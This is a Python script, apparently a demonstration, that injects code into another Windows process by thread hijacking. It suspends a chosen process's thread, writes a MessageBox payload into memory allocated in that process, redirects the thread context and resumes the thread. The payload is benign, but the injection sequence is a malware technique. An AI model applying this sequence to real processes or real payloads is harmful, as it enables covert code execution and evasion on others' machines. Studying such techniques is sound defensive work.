print_hdr("\n>>>>    Handling Process Information: CreateToolhelp32Snapshot()    <<<<\n")
proc_groups, pid_map = group_pids_by_process()  # proc_groups: defaultdict[str, list[int]] // pid_map: dict[int, str]


print_pids_by_process(proc_groups)
chosen_pid = request_pid(pid_map)


with open_process(chosen_pid) as hProcess:
    
    # ----- Thread Id information -----
    print_hdr("\n>>>>    Handling Thread Information: CreateToolhelp32Snapshot()    <<<<\n")
    hThread_worker, dwThreadId_worker = get_single_worker_thread(chosen_pid)
    suspend_thread(hThread_worker, dwThreadId_worker)




    # ----- Payload Prep -----
    message_box_addr = get_message_box_addr()
    payload = create_payload_cowboy(hThread_worker,message_box_addr)



    
    # ----- Memory Manipulation -----
    print_hdr("\n>>>>    Allocating Memory: VirtualAllocEx()    <<<<\n")
    lpBaseAddress = allocate_memory(hProcess, len(payload))
    allocate_memory_verification(hProcess, lpBaseAddress)




    # ----- Write -----
    print_hdr("\n>>>>    Writing Payload to Allocated Memory: WriteProcessMemory()    <<<<\n")
    write_payload(hProcess, lpBaseAddress, payload)
    write_payload_verification(hProcess, lpBaseAddress, payload)




    # ----- Thread Context -----
    print_hdr("\n>>>>    Get CPU Register Information: GetThreadContext()    <<<<\n")
    get_current_registers_context(hThread_worker, lpBaseAddress)




    # ----- Execute -----
    print_hdr("\n>>>>    Executing payload: ResumeThread()    <<<<\n")
    resume_thread(hThread_worker, dwThreadId_worker)




    # ----- Cleanup -----
    print_hdr("\n>>>>    Cleaning up resources    <<<<\n")
    close_handle(hThread_worker, "Worker Thread")

